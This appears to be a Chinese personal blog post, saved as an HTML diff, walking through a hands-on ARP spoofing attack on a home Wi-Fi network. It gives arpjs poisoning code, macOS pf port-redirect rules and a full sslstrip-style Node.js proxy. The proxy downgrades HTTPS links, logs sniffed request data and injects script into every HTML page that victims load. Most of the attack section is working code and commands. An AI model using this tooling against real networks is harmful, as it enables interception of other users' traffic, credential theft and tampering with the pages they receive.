@@ -1,0 +1,377 @@
+<meta charset="utf-8"/>
+<base target='_blank' />
+<meta content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no" name="viewport" />
+<script src="d406894cfa4abad298d58c7b414562d6.js"></script>
+<script src="91620078a585e5bdb8800b8a10c6713f.js"></script>
+<script src="ccac98ae433a8aa600476534a7176a62.js"></script>
+<link href="172a73b72f7c34c71e23b75fc6b0072c.css" type='text/css' rel='stylesheet' />
+<link href="a07e1e35d2e6f45540bf0cc2f4a6f11d.css" type='text/css' rel='stylesheet' />
+<link href="783dbec16270c788c55c8548f11b13ec.css" type='text/css' rel='stylesheet' />
+
+<title>arp欺骗实战</title>
+
+<body class="readonly github-io">
+<div class='tabc'>
+<div class='datelist-btn white-btn'>展开目录</div>
+<div class="tabsr">
+  <div class="tabsr-title">arp欺骗实战</div>
+  <div class="tabsr-tags"><span class="tagz" style="background: #2e0ccd">arp</span></div>
+</div>
+</div>
+<div class='datelist'>
+  <div class='searchdiv'>
+    <div class='datelist-btn-close white-btn'>X</div>
+    <div class="inexport text">
+      陈尼玛的博客
+    </div>
+    <div class="description">记录开发生涯的踩坑经历，用时间来验证成长</div>
+  </div>
+  <div id='lst'></div>
+</div>
+
+<div id="content"><p>吾大学时候主修专业是网络工程，现在由于平时完全用不到这些专业知识，学校里面教的也快要忘干净了。趁这个周末没啥事，复习一下arp欺骗和wireshark抓包。</p>
+<hr>
+<h5 id="系统环境：">系统环境：</h5>
+<p>macbook air OS X 10.12</p>
+<h5 id="软件环境：">软件环境：</h5>
+<p>wireshark2.0.5</p>
+<p>nodejs 6.9.2</p>
+<p>chrome pc浏览器</p>
+<p>家用wifi路由器</p>
+<p>智能机一个（用于测试攻击结果）</p>
+<hr>
+<p>arp攻击的目标是为了突破局域网内无法抓取别人数据包，因此实现思路是：</p>
+<ol>
+<li>找到局域网内的机器ip和网关ip</li>
+<li>告诉其他机器 “我是网关”</li>
+<li>告诉网关 “我是其他机器”</li>
+<li>开启端口转发功能</li>
+<li>编写转发中间件程序，篡改服务器返回的的代码</li>
+<li>修改系统代理规则和端口转发规则</li>
+</ol>
+<hr>
+<h4 id="注意：为了保证必须的操作权限，请开启mac的root用户权限。并且以root用户的身份执行后文提到的所有命令任务。本文默认你已经是以root用户进行操作的。">注意：为了保证必须的操作权限，请开启mac的root用户权限。并且以root用户的身份执行后文提到的所有命令任务。本文默认你已经是以root用户进行操作的。</h4>
+<hr>
+<p>本文我使用的是 <a href="https://github.com/skepticfx/arpjs">arpjs</a>这个node模块，用到其两个功能：</p>
+<ul>
+<li> table方法，获取所有的机器ip</li>
+</ul>
+<pre><code class="language-javascript">var arp = require(&#39;arpjs&#39;)
+
+arp.table(function(e,f){
+   console.log(e || f) // 如果获取成功则f是所有的ip列表，获取到mac地址的则是在线的机器，包括网关机器。网关一般都是ip段的开头那个ip
+})
+</code></pre>
+<ul>
+<li> poison方法，发送arp欺骗请求</li>
+</ul>
+<pre><code class="language-javascript">var arp = require(&#39;arpjs&#39;)
+
+setInterval(()=&gt;{
+
+  // 告诉9这个机器我是网关
+  arp.poison(&#39;192.168.1.9&#39;, &#39;192.168.1.1&#39;)
+  // 告诉网关我是9，下同
+  arp.poison(&#39;192.168.1.1&#39;, &#39;192.168.1.9&#39;)
+
+  //
+  //
+  arp.poison(&#39;192.168.1.6&#39;, &#39;192.168.1.1&#39;)
+  arp.poison(&#39;192.168.1.1&#39;, &#39;192.168.1.6&#39;)
+
+
+},1000)
+</code></pre>
+<p>欺骗成功后目标机已经无法上网了，因为它以为我是网关，结果把请求发给我，但我并不会把这个请求继续往下传，也不给回任何结果。所以下面需要做请求转发。</p>
+<p>最新版mac osx上端口转发功能需要执行以下步骤：</p>
+<ol>
+<li><p>sudo sysctl -w net.inet.ip.forwarding=1</p>
+</li>
+<li><p>sudo vi /etc/pf.anchors/http</p>
+<pre><code>rdr pass on en0 inet proto tcp from any to any port 80 -&gt; 127.0.0.1 port 18080</code></pre>
+<p>:wq</p>
+</li>
+<li><p>sudo vi /etc/pf.conf</p>
+<p>增加代码</p>
+<pre><code>rdr-anchor &quot;http-forwarding&quot;
+load anchor &quot;http-forwarding&quot; from &quot;/etc/pf.anchors/http&quot;</code></pre>
+<p>需要小心必须添加在对应的行下面，否则会报语法错误。比如rdr-anchor这行就要添加在原先代码的rdr-anchor xxxx之下，不能中间空行，也不能跳行。</p>
+</li>
+<li><p>sudo pfctl -vnf /etc/pf.anchors/http</p>
+<p>检查配置正确性</p>
+</li>
+<li><p>sudo pfctl -ef /etc/pf.conf</p>
+<p>导入配置</p>
+</li>
+<li><p>sudo pfctl -E</p>
+<p>使用 -E 命令强制重启 pf 服务：</p>
+<p>此处参考来源：<a href="http://www.jianshu.com/p/6052831a8e91">http://www.jianshu.com/p/6052831a8e91</a></p>
+</li>
+</ol>
+<p>这时已经把请求转发到18080端口上了，最后就是完成18080的业务逻辑。</p>
+<p><code>18080.js</code></p>
+<p>此文件我是抄的<a href="https://github.com/zsky/sslstrip/blob/master/index.js">https://github.com/zsky/sslstrip/blob/master/index.js</a> 。只修改了替换html代码的部分，功能勉强可以用吧，也懒得改了。 </p>
+<pre><code class="language-javascript">const http = require(&#39;http&#39;);
+const https = require(&#39;https&#39;);
+const net = require(&quot;net&quot;);
+const url = require(&quot;url&quot;);
+const zlib = require(&#39;zlib&#39;);
+
+class ProxyServer {
+
+    start(port) {
+        // 存储本应是 https 的链接 url
+        this._urlMap = {};
+
+        const server = http.createServer();
+
+        // handle http
+        server.on(&#39;request&#39;, this.onRequest.bind(this));
+        // handle https
+        server.on(&#39;connect&#39;, this.onConnect);
+
+        // handle errors
+        server.on(&#39;clientError&#39;, (err, socket) =&gt; {
+            console.log(&#39;clientError:&#39;, err);
+        });
+        server.on(&#39;error&#39;, (err) =&gt; {
+            console.log(&#39;serverError:&#39;, err);
+        });
+
+        // listen
+        server.listen(port, () =&gt; {
+            console.log(&#39;SSLstrip Server Listen Port:&#39;, port);
+        })
+    }
+
+    onRequest(request, response) {
+
+        let useSSL = this.shouldBeHttps(request);
+        let options = this.getRequestOptions(request, useSSL);
+        let client = useSSL ? https : http;
+
+        // 向真正的服务器发出请求
+        let remoteRequest = client.request(options, (remoteResponse) =&gt; {
+            // strip location header
+            let locationHeader = remoteResponse.headers.location;
+            if(locationHeader &amp;&amp; locationHeader.includes(&#39;https&#39;)) {
+                remoteResponse.headers.location = locationHeader.replace(&#39;https:&#39;, &#39;http:&#39;);
+                this.updateUrlMap(remoteResponse.headers.location);
+            }
+
+            // 对于 html 响应中的链接进行修改
+            let contentType = remoteResponse.headers[&#39;content-type&#39;];
+            if(contentType &amp;&amp; contentType.includes(&#39;html&#39;)) {
+                this.stripSSL(remoteResponse, response);
+            } else {
+                remoteResponse.pipe(response);
+                response.writeHead(remoteResponse.statusCode, remoteResponse.headers);
+                response.pipe(remoteResponse);
+            }
+        })
+
+        remoteRequest.on(&#39;error&#39;, (err) =&gt; {
+            console.log(&#39;RequestError:&#39;,err, options.host + &#39;:&#39; + options.port + options.path);
+            response.writeHead(502, &#39;Proxy fetch failed&#39;);
+        })
+
+        request.pipe(remoteRequest);
+        if(useSSL) {
+            request.on(&#39;data&#39;, (chunk) =&gt; {
+                console.log(&#39;Sniff:&#39;, chunk.toString());
+            })
+        }
+
+    }
+
+    /**
+     * 判断是否本来应该是 https 的请求
+     */
+    shouldBeHttps(request) {
+        let requestUrl = request.headers.host + url.parse(request.url).pathname;
+        return this._urlMap[requestUrl];
+    }
+
+    /**
+     * 记录本应是 https 请求的 url
+     */
+    updateUrlMap(httpsLink) {
+        // 处理 Url ，只保留 hostname 和 pathname
+        let parseObj = url.parse(httpsLink);
+        let handledUrl = parseObj.hostname + parseObj.pathname;
+        console.log(&#39;Add Url:&#39;, handledUrl);
+        this._urlMap[handledUrl] = true;
+    }
+
+    /**
+     * 获取发出请求的参数
+     */
+    getRequestOptions(request, useSSL) {
+
+        let hostInfo = request.headers.host.split(&#39;:&#39;);
+        let path = request.headers.path || url.parse(request.url).path;
+        let defaultPort = useSSL ? 443 : 80;
+        if(request.method === &#39;POST&#39;) {
+            request.headers[&#39;X-Requested-With&#39;] = &#39;XMLHttpRequest&#39;;
+            request.headers[&#39;accept&#39;] = &#39;application/json&#39;;
+        }
+        return {
+            host: hostInfo[0],
+            port: hostInfo[1] || defaultPort,
+            path: path,
+            method: request.method,
+            headers: request.headers
+        }
+    }
+
+    /**
+     * 修改从服务器返回的响应内容
+     * 更改内容中的 https 链接为 http
+     * 并返回给客户端
+     */
+    stripSSL(remoteResponse, response) {
+        let inputStream, outputStream;
+        // 如果是压缩了的，需要先解压缩再更改内容
+        if(remoteResponse.headers[&#39;content-encoding&#39;] === &#39;gzip&#39;) {
+            inputStream = zlib.createGunzip();
+            outputStream = zlib.createGzip();
+        } else if(remoteResponse.headers[&#39;content-encoding&#39;] === &#39;deflate&#39;) {
+            inputStream = zlib.createInflateRaw();
+            outputStream = zlib.createDeflateRaw();
+        }
+
+        if(inputStream) {
+            remoteResponse.pipe(inputStream);
+            outputStream.pipe(response);
+        } else {
+            inputStream = remoteResponse;
+            outputStream = response;
+        }
+
+        let body = [];
+        inputStream.on(&#39;data&#39;, (chunk) =&gt; {
+            body.push(chunk);
+        })
+        inputStream.on(&#39;end&#39;, () =&gt; {
+            let html = Buffer.concat(body).toString();
+            let urlRegex = /&quot;(https:\/\/[\w\d:#@%\/;$()~_?\+-=\\\.&amp;]*)&quot;/g;
+            html = html.replace(urlRegex, (match, $1) =&gt; {
+                this.updateUrlMap($1);
+                return match.replace(&#39;https&#39;, &#39;http&#39;);
+            })
+
+            if((remoteResponse.headers[&#39;content-type&#39;]||&#39;&#39;).match(/text\/html/)){
+              html=html+`&lt;script&gt;alert(&quot;你中招了&quot;)&lt;/script&gt;`
+            }
+
+            outputStream.end(html);
+        })
+
+        delete remoteResponse.headers[&#39;content-length&#39;];
+        response.writeHead(remoteResponse.statusCode, remoteResponse.headers);
+        response.pipe(remoteResponse);
+    }
+
+    /**
+     * handle https
+     */
+    onConnect(request, socket, head) {
+        let options = {
+            host: request.url.split(&#39;:&#39;)[0],
+            port: request.url.split(&#39;:&#39;)[1] || 443
+        }
+
+        socket.on(&#39;error&#39;, (err) =&gt; {
+            console.log(&#39;Https socket error&#39;);
+        })
+
+        let tunnel = net.createConnection(options, () =&gt; {
+            let content = &#39;HTTP/1.1 200 Connection established\r\nConnection: keep-alive\r\n\r\n&#39;;
+            socket.write(content, &#39;UTF-8&#39;, () =&gt; {
+                tunnel.pipe(socket);
+                socket.pipe(tunnel);
+            })
+        })
+
+        tunnel.on(&#39;error&#39;, (err) =&gt; {
+            console.log(&#39;Https connect to server error&#39;,err,options);
+        })
+
+    }
+}
+
+let proxy = new ProxyServer();
+proxy.start(18080);
+</code></pre>
+<hr>
+<p>至此，完整的arp攻击就完成了，只要有任何人连入这个wifi，访问http网站都会被注入这个代码。</p>
+<p>攻击效果：</p>
+<ol>
+<li>得到网站返回代码的完全操控权</li>
+<li>可以从wireshark中截获全部的通信数据</li>
+</ol>
+<p>相当霸道。</p>
+<p>https目前无解，等以后https普及了这种攻击的效果才会弱化吧。</p>
+<blockquote>
+<h3 id="相关文档">相关文档</h3>
+</blockquote>
+<ol>
+<li><p><a href="58845.html">arp欺骗实战</a></p>
+</li>
+<li><p><a href="58825.html">找树莓派的内网ip</a></p>
+</li>
+</ol>
+<blockquote>
+<h3 id="随便看看">随便看看</h3>
+</blockquote>
+<ol>
+<li><p><a href="kh4hp4u7.5l8.html">react项目webpack打包时拆分异步加载的文件</a></p>
+</li>
+<li><p><a href="kh4hp4xg.2sb.html">sass变量和继承类写法</a></p>
+</li>
+<li><p><a href="kh4hp4ya.6e.html">ipsec vpn 添加新账号</a></p>
+</li>
+<li><p><a href="kh4hp4yo.gfd.html">nodejs 长连接</a></p>
+</li>
+<li><p><a href="kh4hp50h.0q9.html">curl用法</a></p>
+</li>
+<li><p><a href="kh4hp51g.d79.html">SSL certificate problem: self signed certificate in certificate chain</a></p>
+</li>
+<li><p><a href="kh4i04i8.s1n.html">nodejs socks5</a></p>
+</li>
+<li><p><a href="kh4hp57y.fpf.html">npm设置仓库地址和代理</a></p>
+</li>
+<li><p><a href="kh4ib7jk.t1.html">mongodb2.4 添加用户</a></p>
+</li>
+<li><p><a href="88328.html">python下载文件，带进度条控制</a></p>
+</li>
+<li><p><a href="88229.html">mysql导出csv文件</a></p>
+</li>
+<li><p><a href="88103.html">ie8上Image.onload不触发问题</a></p>
+</li>
+<li><p><a href="87999.html">bootstrap modal弹框导致ie无法获取焦点</a></p>
+</li>
+<li><p><a href="87991.html">数据库清理优化</a></p>
+</li>
+<li><p><a href="87823.html">youku电脑版跳过广告代码</a></p>
+</li>
+<li><p><a href="87218.html">感谢beego陪伴我度过那不靠谱的半年</a></p>
+</li>
+<li><p><a href="79547.html">前端性能观察器</a></p>
+</li>
+<li><p><a href="75653.html">判断点是否在多边形内</a></p>
+</li>
+<li><p><a href="73791.html">读写分离！拆表！</a></p>
+</li>
+</ol>
+</div>
+
+<div class="body-mask"></div>
+
+<script>
+var qid="58845";
+var LOGINED=0;
+var IS_FOR_GITHUB_IO=1;
+</script>
+<script src="3287a981a890e10d9ffc6af37b73ff89.js"></script>
+</body>
